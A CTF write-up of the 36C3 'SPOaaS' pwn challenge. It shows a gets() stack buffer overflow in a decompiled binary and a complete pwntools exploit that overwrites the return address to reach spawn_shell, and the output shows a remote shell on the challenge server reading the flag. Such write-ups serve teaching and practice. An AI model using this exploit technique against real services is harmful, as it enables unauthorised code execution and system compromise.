# SPOaaS
Pwn, Easy

## Description

> Welcome to Stack Buffer Overflow as a Service! Since modern mitigations made it more difficult to exploit vulnerabilities, we decided to offer an easy and convenient service for everyone to experience the joy of exploiting a stack-based buffer overflow. Simply enter your data and win! nc 209.250.235.77 22222

A binary file was attached.

## Solution

Let's inspect the binary file:

```console
root@kali:/media/sf_CTFs/36c3/SPOaaS# file stack
stack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=076e706085388e7880893724f98034ce9b60bead, not stripped
root@kali:/media/sf_CTFs/36c3/SPOaaS# checksec.sh -f stack
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified  Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols      No      0           4stack
```

Let's open it with Ghidra:

```c
undefined8 main(void)
{
  setvbuf(stdout,(char *)0x0,2,0);
  stack();
  puts("Thank you for using SBOaaS :)");
  return 0;
}

void stack(void)
{
  char acStack1352 [1352];
  
  puts(
      "\n------------------------------------------------------------------\n                             SBOaaS                             \n------------------------------------------------------------------\n\nWelcome to StackBuffer Overflow as a Service\n\nSince modern mitigations made it more difficult to exploitvulnerabilities,\nwe decided to offer an easy and convenient service for everyone\ntoexperience the joy of exploiting a stack-based buffer overflow.\nSimply enter your data andwin!\n"
      );
  printf("Please enter your data. Good luck!\n> ");
  gets(acStack1352);
  return;
}
```

This is a very simple buffer overflow. We'll override the return address of `stack` and jump to:

```c
void spawn_shell(void)

{
  char *local_18;
  undefined8 local_10;
  
  local_18 = "/bin/bash";
  local_10 = 0;
  execve("/bin/bash",&local_18,(char **)0x0);
  return;
}
```

The exploit:

```python
# Generate template using:
# pwn template --host 209.250.235.77 --port 22222 ./stack
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

import os

def send_payload(proc, payload):
    proc.sendlineafter("> ", payload)


def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(1380, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {} ({}-byte architecture)".format(offset, exe.bytes))
    return offset


overflow_offset = get_overflow_offset()

log.info("spawn_shell() address: {}".format(hex(exe.symbols["spawn_shell"])))

io = start()
payload = fit({overflow_offset: exe.symbols["spawn_shell"]}, filler = 'B')

send_payload(io, payload)

io.interactive()
```

The output:

```console
root@kali:/media/sf_CTFs/36c3/SPOaaS# python exploit.py
[*] '/media/sf_CTFs/36c3/SPOaaS/stack'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/media/sf_CTFs/36c3/SPOaaS/stack': pid 2446
[*] Process '/media/sf_CTFs/36c3/SPOaaS/stack' stopped with exit code -11 (SIGSEGV) (pid 2446)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/36c3/SPOaaS/core.2446'
    Arch:      amd64-64-little
    RIP:       0x40068a
    RSP:       0x7fffce3b59d8
    Exe:       '/media/sf_CTFs/36c3/SPOaaS/stack' (0x400000)
    Fault:     0x6761616161616174
[*] Overflow offset: 1352 (8-byte architecture)
[*] spawn_shell() address: 0x40068b
[+] Opening connection to 209.250.235.77 on port 22222: Done
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
stack
sys
tmp
usr
var
$ cat flag.txt
junior-20165bcdbfebe4710bd0a1c168a5e752d999676e
$
```